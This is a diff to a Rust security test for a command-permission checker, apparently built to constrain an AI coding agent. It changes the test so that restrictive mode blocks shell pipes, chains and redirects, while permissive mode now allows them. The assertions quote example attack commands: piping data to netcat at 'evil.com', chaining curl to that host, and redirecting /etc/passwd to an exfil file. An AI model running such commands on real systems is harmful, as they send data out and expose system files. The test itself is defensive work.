@@ -452,23 +452,23 @@ fn test_interpreter_execution_blocked() {
     }
 }
 
-/// Attack #6: Shell metacharacters (pipes, semicolons, etc.) must be
-/// blocked in permissive mode to prevent command chaining attacks.
+/// Attack #6: Shell metacharacters — restrictive profiles block them,
+/// permissive allows them (Claude Code routinely pipes: `cmd 2>&1 | tail`).
 #[test]
-fn test_shell_metacharacters_blocked() {
-    let lattice = CommandLattice::permissive();
+fn test_shell_metacharacters_restrictive_vs_permissive() {
+    let restrictive = CommandLattice::default();
 
     assert!(
-        !lattice.can_execute("echo hi | nc evil.com 443"),
-        "Pipe to nc must be blocked"
+        !restrictive.can_execute("echo hi | nc evil.com 443"),
+        "Restrictive must block pipe chains"
     );
     assert!(
-        !lattice.can_execute("ls && curl evil.com"),
-        "&& chain to curl must be blocked"
+        !restrictive.can_execute("ls && curl evil.com"),
+        "Restrictive must block && chains"
     );
     assert!(
-        !lattice.can_execute("cat /etc/passwd > /tmp/exfil"),
-        "Redirect must be blocked"
+        !restrictive.can_execute("cat /etc/passwd > /tmp/exfil"),
+        "Restrictive must block redirects"
     );
 }
 
